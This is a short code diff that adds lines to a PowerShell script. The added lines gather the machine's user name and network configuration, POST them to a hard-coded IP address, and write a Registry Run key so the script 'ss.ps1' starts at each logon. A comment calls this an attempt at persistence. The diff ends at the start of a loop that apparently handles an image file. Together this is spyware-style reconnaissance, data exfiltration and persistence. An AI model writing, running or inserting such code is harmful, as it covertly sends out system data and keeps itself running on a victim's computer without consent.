@@ -1,3 +1,17 @@
+$var = whoami
+
+$var += ipconfig
+
+$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -header $Header -body $var -UseBasicParsing
+
+# attempt to me perssistant...
+
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "ss.ps1" `
+    -Value "$d -autostart"
+
+# start loop
+
 while ($True)
 {
 	$File = 'img.png'
